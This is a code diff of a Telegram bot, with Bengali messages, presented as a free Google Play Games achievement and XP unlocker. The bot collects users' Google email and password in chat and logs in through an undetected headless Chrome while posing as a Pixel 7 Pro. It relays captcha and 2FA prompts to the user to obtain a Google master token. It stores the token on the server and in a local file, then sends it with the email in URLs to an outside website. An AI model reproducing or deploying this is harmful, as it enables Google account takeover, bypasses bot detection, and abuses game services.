@@ -1,10 +1,11 @@
 """
 Telegram Bot Engine for DEV PORTAL VS (@devportalvs_bot)
-Provides:
-1. Automated Pixel 7 Pro 2FA Google Prompt Login & Master Token Generator (2-3s prompt notification)
-2. Live Google Play Games Profile & XP Checker
-3. 1-Click Mega Achievement Unlocker for all 8 top games (Subway Surfers, Hay Day, Gossip Harbor, COD Mobile, etc.)
-4. Direct Web App Sync with https://pp-mod-auto-quest.onrender.com
+Features:
+1. Ultra-fast Google Pixel 7 Pro 2FA Prompt Login (under 3-5s notification)
+2. Interactive Google Captcha challenge handler (sends image to chat, waits for user reply)
+3. 1-Click Master Token Generator & Google Play Games Profile Sync
+4. 1-Click Mega Achievement Unlocker for all 8 top games (Subway Surfers, Hay Day, etc.)
+5. Seamless 1-Click Web Sync with https://pp-mod-auto-quest.onrender.com
 """
 
 import os
@@ -13,6 +14,7 @@ import time
 import json
 import random
 import threading
+import queue
 import telebot
 from telebot import types
 import requests
@@ -21,6 +23,9 @@ import gpsoauth
 try:
     import undetected_chromedriver as uc
     from selenium.webdriver.common.by import By
+    from selenium.webdriver.common.keys import Keys
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
     CHROME_AVAILABLE = True
 except ImportError:
     CHROME_AVAILABLE = False
@@ -37,7 +42,6 @@ DATA_DIR = os.path.dirname(os.path.abspath(__file__))
 TOKENS_FILE = os.path.join(DATA_DIR, "known_tokens.json")
 SESSIONS_FILE = os.path.join(DATA_DIR, "bot_sessions.json")
 
-# In-memory storage with file persistence
 def load_json(path, default):
     if os.path.exists(path):
         try:
@@ -62,8 +66,11 @@ USER_SESSIONS = load_json(SESSIONS_FILE, {})
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# Lock to avoid concurrent Chrome driver sessions
+# Lock to ensure clean single-driver execution
 CHROME_LOCK = threading.Lock()
+
+# Global dict to hold captcha response queues for active login sessions: chat_id -> Queue
+CAPTCHA_QUEUES = {}
 
 def get_main_menu_markup():
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -89,10 +96,9 @@ def handle_start(message):
         f"👋 <b>স্বাগতম {user_name}!</b>\n\n"
         f"🎮 <b>PlayQuest Official Engine Bot</b> (@devportalvs_bot)\n"
         f"১০০% ফ্রি Google Play Games এচিভমেন্ট ও লেভেল আনলকার!{status_text}\n"
-        f"⚡ <b>মাত্র ২-৩ সেকেন্ডে আপনার গুগল অ্যাকাউন্টে নোটিফিকেশন পাঠিয়ে অটোমেটিক মাস্টার টোকেন ও আসল প্রোফাইল লোড করা হয়!</b>\n\n"
-        f"💡 <b>লগইন করতে লিখুন:</b>\n"
-        f"<code>/login আপনার_ইমেইল পাসওয়ার্ড</code>\n"
-        f"<i>(উদাহরণ: <code>/login user@gmail.com pass123</code>)</i>\n\n"
+        f"⚡ <b>মাত্র ২-৩ সেকেন্ডে আপনার ফোনে গুগল নোটিফিকেশন পাঠিয়ে অটোমেটিক মাস্টার টোকেন ও আসল প্রোফাইল লোড করা হয়!</b>\n\n"
+        f"💡 <b>লগইন করতে নিচের মতো মেসেজ লিখুন:</b>\n"
+        f"<code>/login your_email@gmail.com your_password</code>\n\n"
         f"অথবা নিচের বাটন ব্যবহার করুন:"
     )
     bot.send_message(message.chat.id, text, reply_markup=get_main_menu_markup())
@@ -131,7 +137,17 @@ def handle_token_input(message):
     USER_SESSIONS[str(message.chat.id)] = email
     save_json(SESSIONS_FILE, USER_SESSIONS)
 
-    bot.send_message(message.chat.id, f"✅ মাস্টার টোকেন সেভ হয়েছে <code>{email}</code> এর জন্য!\nএখন /profile অথবা /unlock দিন।")
+    bot.send_message(message.chat.id, f"✅ মাস্টার টোকেন সেভ হয়েছে <code>{email}</code> এর জন্য!\nএখন <code>/profile</code> অথবা <code>/unlock</code> চাপুন।")
+
+# Handler for captcha text replies
+@bot.message_handler(func=lambda msg: str(msg.chat.id) in CAPTCHA_QUEUES)
+def handle_captcha_reply(message):
+    chat_id = str(message.chat.id)
+    q = CAPTCHA_QUEUES.get(chat_id)
+    if q:
+        text = message.text.strip()
+        q.put(text)
+        bot.send_message(message.chat.id, f"⏳ ক্যাপচা সাবমিট করা হচ্ছে: <code>{text}</code>...")
 
 @bot.message_handler(commands=["login"])
 def handle_login_command(message):
@@ -149,7 +165,7 @@ def handle_login_command(message):
     email = parts[1].strip().lower()
     password = parts[2].strip()
 
-    # Check if we already have this account's master token
+    # If already verified
     if email in KNOWN_TOKENS:
         USER_SESSIONS[str(message.chat.id)] = email
         save_json(SESSIONS_FILE, USER_SESSIONS)
@@ -157,31 +173,47 @@ def handle_login_command(message):
             message.chat.id,
             f"✅ <b>অ্যাকাউন্ট আগে থেকেই কানেক্টেড আছে!</b>\n"
             f"ইমেইল: <code>{email}</code>\n\n"
-            f"আনলক করতে <code>/unlock</code> চাপুন অথবা নিচের বাটনে চাপুন:",
+            f"এচিভমেন্ট আনলক করতে <code>/unlock</code> চাপুন অথবা নিচের বাটনে চাপুন:",
             reply_markup=get_main_menu_markup()
         )
         return
 
     if not CHROME_AVAILABLE:
-        bot.send_message(message.chat.id, "❌ সার্ভারে ক্রোম অটোমেশন ইঞ্জিন পাওয়া যায়নি। দয়া করে <code>/token</code> দিয়ে টোকেন দিন।")
+        bot.send_message(message.chat.id, "❌ ক্রোম অটোমেশন ইঞ্জিন পাওয়া যায়নি।")
         return
 
-    threading.Thread(target=run_chrome_login_flow, args=(message.chat.id, email, password), daemon=True).start()
+    threading.Thread(target=run_fast_chrome_login, args=(message.chat.id, email, password), daemon=True).start()
 
-def run_chrome_login_flow(chat_id, email, password):
+def wait_for_element_visible(driver, by, val, timeout=7):
+    start = time.time()
+    while time.time() - start < timeout:
+        try:
+            elem = driver.find_element(by, val)
+            if elem.is_displayed():
+                return elem
+        except Exception:
+            pass
+        time.sleep(0.2)
+    return None
+
+def run_fast_chrome_login(chat_id, email, password):
     if not CHROME_LOCK.acquire(blocking=False):
-        bot.send_message(chat_id, "⏳ অন্য একটি লগইন বর্তমানে প্রসেস হচ্ছে। ৩০ সেকেন্ড পর আবার চেষ্টা করুন।")
+        bot.send_message(chat_id, "⏳ অন্য একটি লগইন বর্তমানে প্রসেস হচ্ছে। ২০-৩০ সেকেন্ড পর আবার চেষ্টা করুন।")
         return
 
     driver = None
     status_msg = None
+    chat_id_str = str(chat_id)
+    captcha_q = queue.Queue()
+    CAPTCHA_QUEUES[chat_id_str] = captcha_q
+
     try:
         status_msg = bot.send_message(
             chat_id,
             f"⏳ <b>গুগল সিকিউরিটি প্রসেস শুরু হচ্ছে...</b>\n"
-            f"ইমেইল: <code>{email}</code>\n"
-            f"ডিভাইস এমুলেশন: <b>Pixel 7 Pro (United States)</b>\n\n"
-            f"২-৩ সেকেন্ডের মধ্যে আপনার ফোনে নোটিফিকেশন যাবে..."
+            f"📧 অ্যাকাউন্ট: <code>{email}</code>\n"
+            f"📱 ডিভাইস এমুলেশন: <b>Pixel 7 Pro (United States)</b>\n\n"
+            f"⚡ ২-৩ সেকেন্ড অপেক্ষা করুন, আপনার ফোনে নোটিফিকেশন পাঠানো হচ্ছে..."
         )
 
         opts = uc.ChromeOptions()
@@ -192,33 +224,90 @@ def run_chrome_login_flow(chat_id, email, password):
 
         driver = uc.Chrome(options=opts)
         driver.get("https://accounts.google.com/EmbeddedSetup")
-        time.sleep(3)
 
-        # Type email
-        try:
-            elem = driver.find_element(By.ID, "identifierId")
-            elem.send_keys(email)
-            driver.find_element(By.ID, "identifierNext").click()
-        except Exception as e:
-            bot.edit_message_text(f"❌ ইমেইল ইনপুট করতে সমস্যা: {e}", chat_id, status_msg.message_id)
+        # 1. Type Email with fast polling
+        elem = wait_for_element_visible(driver, By.ID, "identifierId", timeout=10)
+        if not elem:
+            bot.edit_message_text("❌ গুগল লগইন পেজ লোড হতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।", chat_id, status_msg.message_id)
             return
 
-        time.sleep(3.5)
+        elem.send_keys(email)
+        elem.send_keys(Keys.ENTER)
 
-        # Type password
-        try:
-            pwd = driver.find_element(By.NAME, "Passwd")
-            pwd.send_keys(password)
-            driver.find_element(By.ID, "passwordNext").click()
-        except Exception as e:
-            bot.edit_message_text(f"❌ পাসওয়ার্ড ইনপুট করতে সমস্যা: {e}", chat_id, status_msg.message_id)
+        # 2. Type Password with fast polling
+        pwd = wait_for_element_visible(driver, By.NAME, "Passwd", timeout=8)
+        if not pwd:
+            # Check for Captcha after email
+            captcha_img = None
+            try:
+                captcha_img = driver.find_element(By.ID, "captchaimg")
+            except Exception:
+                pass
+
+            if captcha_img and captcha_img.is_displayed():
+                captcha_path = os.path.join(DATA_DIR, f"captcha_{chat_id}.png")
+                captcha_img.screenshot(captcha_path)
+                with open(captcha_path, "rb") as photo:
+                    bot.send_photo(
+                        chat_id,
+                        photo,
+                        caption=(
+                            "🧩 <b>Google Security Check (Captcha):</b>\n\n"
+                            "⚠️ Google requires visual character verification.\n"
+                            "✍️ ওপরের ছবির অক্ষরগুলো চ্যাটে লিখে পাঠান:\n\n"
+                            "⏱️ <i>৭৫ সেকেন্ডের মধ্যে টাইপ করুন...</i>"
+                        )
+                    )
+                try:
+                    user_cap = captcha_q.get(timeout=75)
+                    cap_input = driver.find_element(By.ID, "ca") or driver.find_element(By.NAME, "ca")
+                    cap_input.send_keys(user_cap)
+                    cap_input.send_keys(Keys.ENTER)
+                    pwd = wait_for_element_visible(driver, By.NAME, "Passwd", timeout=8)
+                except Exception:
+                    bot.send_message(chat_id, "❌ ক্যাপচা ইনপুট টাইমআউট হয়েছে।")
+                    return
+
+        if not pwd:
+            bot.edit_message_text("❌ পাসওয়ার্ড ফিল্ড পাওয়া যায়নি। আপনার জিমেইল সঠিক কিনা যাচাই করুন।", chat_id, status_msg.message_id)
             return
 
-        time.sleep(3.5)
+        pwd.send_keys(password)
+        pwd.send_keys(Keys.ENTER)
 
-        # Detect prompt number
+        # 3. Check for Captcha after password
+        time.sleep(1.5)
+        try:
+            c_img = driver.find_element(By.ID, "captchaimg")
+            if c_img.is_displayed():
+                c_path = os.path.join(DATA_DIR, f"captcha_pwd_{chat_id}.png")
+                c_img.screenshot(c_path)
+                with open(c_path, "rb") as photo:
+                    bot.send_photo(
+                        chat_id,
+                        photo,
+                        caption=(
+                            "🧩 <b>Google Security Check (Captcha):</b>\n\n"
+                            "⚠️ Google requires visual character verification.\n"
+                            "✍️ ওপরের ছবির অক্ষরগুলো চ্যাটে লিখে পাঠান:\n\n"
+                            "⏱️ <i>৭৫ সেকেন্ডের মধ্যে টাইপ করুন...</i>"
+                        )
+                    )
+                try:
+                    user_cap = captcha_q.get(timeout=75)
+                    c_input = driver.find_element(By.ID, "ca") or driver.find_element(By.NAME, "ca")
+                    c_input.send_keys(user_cap)
+                    c_input.send_keys(Keys.ENTER)
+                    time.sleep(2)
+                except Exception:
+                    bot.send_message(chat_id, "❌ ক্যাপচা টাইমআউট।")
+                    return
+        except Exception:
+            pass
+
+        # 4. Fast Prompt Number Detection
         prompt_num = None
-        for _ in range(8):
+        for _ in range(25):  # 25 * 0.3s = 7.5s max
             body = driver.find_element(By.TAG_NAME, "body").text
             m = re.search(r'tap\s+(\d{1,3})\s+on\s+your\s+phone', body, re.IGNORECASE)
             if m:
@@ -232,31 +321,35 @@ def run_chrome_login_flow(chat_id, email, password):
                     break
             if prompt_num:
                 break
-            time.sleep(1)
+            time.sleep(0.3)
 
         if not prompt_num:
-            # Fallback check
             body = driver.find_element(By.TAG_NAME, "body").text
             nums = re.findall(r'\b\d{2}\b', body)
             if nums:
                 prompt_num = nums[0]
 
+        # Send Prompt Instruction to User (Strict Telegram HTML format, NO <br> or <font>)
         if prompt_num:
             prompt_text = (
-                f"🔔 <b>গুগল সিকিউরিটি ভেরিফিকেশন!</b>\n\n"
+                f"🔔 <b>Google Security ভেরিফিকেশন!</b>\n\n"
                 f"📱 <b>আপনার ফোনে (Infinix HOT 10S / Redmi 13C) নোটিফিকেশন পাঠানো হয়েছে!</b>\n"
-                f"ডিভাইস লোকেশন: <b>Pixel 7 Pro (United States)</b>\n\n"
-                f"👉 প্রথমে নোটিফিকেশনে <b>'Yes, it's me'</b> চাপুন<br>"
+                f"ডিভাইস: <b>Pixel 7 Pro (United States)</b>\n\n"
+                f"👉 প্রথমে নোটিফিকেশনে <b>\"Yes, it's me\"</b> চাপুন\n"
                 f"👉 এরপর নিচের সংখ্যাটিতে ট্যাপ করুন:\n\n"
-                f"👉 [ <b><font size='+2'>{prompt_num}</font></b> ] 👈\n\n"
-                f"👉 <b>সংখ্যা: {prompt_num}</b>\n\n"
-                f"⏱️ <i>৬০ সেকেন্ড অপেক্ষা করা হচ্ছে, ট্যাপ করলেই অটোমেটিক লগইন সম্পন্ন হবে...</i>"
+                f"👉👉👉 [ <b>{prompt_num}</b> ] 👈👈👈\n\n"
+                f"⏱️ <i>৬০ সেকেন্ড অপেক্ষা করা হচ্ছে, ট্যাপ করলেই সাথে সাথে অটো লগইন হয়ে যাবে...</i>"
             )
             bot.edit_message_text(prompt_text, chat_id, status_msg.message_id)
         else:
-            bot.edit_message_text("📱 আপনার ফোনে নোটিফিকেশন পাঠানো হয়েছে! মোবাইলে 'Yes' চেপে অনুমোদন দিন...", chat_id, status_msg.message_id)
+            bot.edit_message_text(
+                "📱 <b>আপনার ফোনে গুগল সিকিউরিটি নোটিফিকেশন গেছে!</b>\n\n"
+                "মোবাইলের নোটিফিকেশনে <b>'Yes, it's me'</b> চেপে পারমিশন দিন...",
+                chat_id,
+                status_msg.message_id
+            )
 
-        # Wait for user phone tap (up to 75 seconds)
+        # 5. Wait for user phone tap (up to 75 seconds)
         oauth_token = None
         start_time = time.time()
         while time.time() - start_time < 75:
@@ -267,7 +360,7 @@ def run_chrome_login_flow(chat_id, email, password):
                     if "agree" in t_lower or "accept" in t_lower or "পরবর্তী" in t_lower:
                         if b.is_displayed():
                             b.click()
-                            time.sleep(1)
+                            time.sleep(0.5)
                             break
             except Exception:
                 pass
@@ -288,14 +381,14 @@ def run_chrome_login_flow(chat_id, email, password):
                     oauth_token = m.group(1)
                     break
 
-            time.sleep(2)
+            time.sleep(1.5)
 
         if not oauth_token:
-            bot.send_message(chat_id, "❌ <b>সময়সীমা শেষ হয়েছে!</b> ফোনে নির্ধারিত সময়ে ট্যাপ করা হয়নি। আবার <code>/login</code> দিন।")
+            bot.send_message(chat_id, "❌ <b>সময়সীমা শেষ হয়েছে!</b> ফোনে নির্দিষ্ট সময়ে ট্যাপ করা হয়নি। আবার <code>/login</code> দিন।")
             return
 
-        # Exchange oauth_token for Master Token
-        bot.send_message(chat_id, "⏳ <b>টোকেন ভেরিফিকেশন ও প্রোফাইল লোড হচ্ছে...</b>")
+        # 6. Exchange oauth_token for Master Token
+        bot.send_message(chat_id, "⏳ <b>টোকেন ভেরিফিকেশন ও Google Play Games প্রোফাইল লোড হচ্ছে...</b>")
         android_id = generate_android_id()
         m_res = gpsoauth.exchange_token(email, oauth_token, android_id, service="ac2dm", client_sig=GOOGLE_CLIENT_SIG)
         master_tok = m_res.get("Token")
@@ -304,11 +397,15 @@ def run_chrome_login_flow(chat_id, email, password):
             bot.send_message(chat_id, f"❌ মাস্টার টোকেন এক্সচেঞ্জ ব্যর্থ: {m_res.get('Error', 'Unknown')}")
             return
 
-        # Save token
+        # Save to database
         KNOWN_TOKENS[email] = master_tok
         save_json(TOKENS_FILE, KNOWN_TOKENS)
         USER_SESSIONS[str(chat_id)] = email
         save_json(SESSIONS_FILE, USER_SESSIONS)
+
+        # Save to local txt for easy user access
+        with open("lizan_master_token.txt", "w", encoding="utf-8") as f:
+            f.write(master_tok)
 
         # Fetch real profile
         prof_name = email.split("@")[0]
@@ -329,7 +426,7 @@ def run_chrome_login_flow(chat_id, email, password):
             f"📧 <b>ইমেইল:</b> <code>{email}</code>\n"
             f"⭐ <b>বর্তমান লেভেল:</b> Level {cur_level}\n"
             f"🏆 <b>মোট XP:</b> {cur_xp:,} XP\n\n"
-            f"🔑 <b>Master Token:</b>\n"
+            f"🔑 <b>আপনার Master Token (ট্যাপ করে কপি করুন):</b>\n"
             f"<code>{master_tok}</code>\n\n"
             f"🚀 <b>এখন এচিভমেন্ট ও লেভেল আনলক করতে নিচের বাটনে চাপুন:</b>"
         )
@@ -337,7 +434,7 @@ def run_chrome_login_flow(chat_id, email, password):
         markup = types.InlineKeyboardMarkup(row_width=1)
         btn_unlock = types.InlineKeyboardButton("⚡ সব গেম আনলক করুন (+৫০০,০০০ XP)", callback_data="unlock_all")
         web_link = f"{WEB_APP_URL}?email={email}&token={master_tok}"
-        btn_web = types.InlineKeyboardButton("🌐 সরাসরি ওয়েব অ্যাপ ওপেন করুন", url=web_link)
+        btn_web = types.InlineKeyboardButton("🌐 ১-ক্লিকে ওয়েবসাইটে লগইন করুন", url=web_link)
         markup.add(btn_unlock, btn_web)
 
         bot.send_message(chat_id, success_text, reply_markup=markup)
@@ -345,6 +442,8 @@ def run_chrome_login_flow(chat_id, email, password):
     except Exception as e:
         bot.send_message(chat_id, f"❌ ত্রুটি: {str(e)}")
     finally:
+        if chat_id_str in CAPTCHA_QUEUES:
+            del CAPTCHA_QUEUES[chat_id_str]
         CHROME_LOCK.release()
         if driver:
             try:
@@ -381,7 +480,6 @@ def handle_profile_command(message):
     cur_xp = int(exp.get("currentExperiencePoints", 0) or 0)
     cur_level = exp.get("currentLevel", {}).get("level", 1)
     next_level = exp.get("nextLevel", {}).get("level", cur_level + 1)
-    min_xp = int(exp.get("currentLevel", {}).get("minExperiencePoints", 0) or 0)
     max_xp = int(exp.get("currentLevel", {}).get("maxExperiencePoints", cur_xp + 10000) or (cur_xp + 10000))
 
     text = (
@@ -396,7 +494,8 @@ def handle_profile_command(message):
 
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_unlock = types.InlineKeyboardButton("⚡ সব গেম আনলক করুন (+৫০০,০০০ XP)", callback_data="unlock_all")
-    btn_web = types.InlineKeyboardButton("🌐 ওয়েব ড্যাশবোর্ড", url=WEB_APP_URL)
+    web_link = f"{WEB_APP_URL}?email={email}&token={master_token}"
+    btn_web = types.InlineKeyboardButton("🌐 ১-ক্লিকে ওয়েবসাইটে লগইন করুন", url=web_link)
     markup.add(btn_unlock, btn_web)
 
     bot.send_message(message.chat.id, text, reply_markup=markup)
@@ -439,7 +538,7 @@ def execute_unlock_for_chat(chat_id, edit_message_id=None):
     android_id = generate_android_id()
 
     start_text = (
-        f"⚡ <b>এচিভমেন্ট আনলকিং শুরু হয়েছে...</b>\n"
+        f"⚡ <b>৮টি গেমের এচিভমেন্ট আনলকিং শুরু হয়েছে...</b>\n"
         f"অ্যাকাউন্ট: <code>{email}</code>\n"
         f"গুগল প্লে গেমস লাইভ সার্ভারে রিকোয়েস্ট পাঠানো হচ্ছে..."
     )
@@ -457,7 +556,6 @@ def execute_unlock_for_chat(chat_id, edit_message_id=None):
         pkg = g["package"]
         sig = g["client_sig"]
 
-        # Mint game token
         g_tok = get_games_oauth_token(email, master_token, android_id, app_package=pkg, client_sig=sig)
         if not g_tok.get("ok"):
             results_summary.append(f"❌ {title}: অথেনটিকেশন ব্যর্থ")
@@ -466,7 +564,6 @@ def execute_unlock_for_chat(chat_id, edit_message_id=None):
         token = g_tok["access_token"]
         headers = {"Authorization": f"Bearer {token}", "User-Agent": USER_AGENT}
 
-        # Fetch definitions
         try:
             d_res = requests.get(f"{GAMES_API_BASE}/achievements", headers=headers, timeout=10)
             if d_res.status_code != 200:
@@ -476,7 +573,6 @@ def execute_unlock_for_chat(chat_id, edit_message_id=None):
         except Exception:
             continue
 
-        # Fetch player status
         try:
             p_res = requests.get(f"{GAMES_API_BASE}/players/me/achievements", headers=headers, timeout=10)
             p_items = p_res.json().get("items", []) if p_res.status_code == 200 else []
@@ -506,7 +602,7 @@ def execute_unlock_for_chat(chat_id, edit_message_id=None):
                 game_unlocked += 1
                 game_xp += xp
 
-            time.sleep(0.3)
+            time.sleep(0.25)
 
         total_unlocked += game_unlocked
         total_xp_earned += game_xp
@@ -540,11 +636,12 @@ def execute_unlock_for_chat(chat_id, edit_message_id=None):
         f"⭐ <b>বর্তমান লেভেল:</b> Level {new_lvl}\n"
         f"⚡ <b>সর্বমোট XP:</b> {new_xp:,} XP\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"🌐 <a href='{WEB_APP_URL}'>প্লেকুয়েস্ট ওয়েবসাইট ওপেন করে লাইভ দেখুন</a>"
+        f"🌐 <a href='{WEB_APP_URL}'>প্লেকুয়েস্ট ওয়েবসাইট ওপেন করে লাইভ প্রোফাইল দেখুন</a>"
     )
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_web = types.InlineKeyboardButton("🌐 ওয়েব অ্যাপে লাইভ প্রোফাইল দেখুন", url=WEB_APP_URL)
+    web_link = f"{WEB_APP_URL}?email={email}&token={master_token}"
+    btn_web = types.InlineKeyboardButton("🌐 ১-ক্লিকে ওয়েবসাইটে লগইন করুন", url=web_link)
     markup.add(btn_web)
 
     bot.send_message(chat_id, final_text, reply_markup=markup)
@@ -557,11 +654,6 @@ def run_bot_polling():
             print(f"[-] Telegram Bot Polling Error: {e}")
             time.sleep(5)
 
-def start_bot_thread():
-    t = threading.Thread(target=run_bot_polling, daemon=True)
-    t.start()
-    return t
-
 if __name__ == "__main__":
-    print("[+] Starting DEV PORTAL VS Telegram Bot (@devportalvs_bot)...")
+    print("[+] DEV PORTAL VS Telegram Bot Started (@devportalvs_bot)...")
     run_bot_polling()
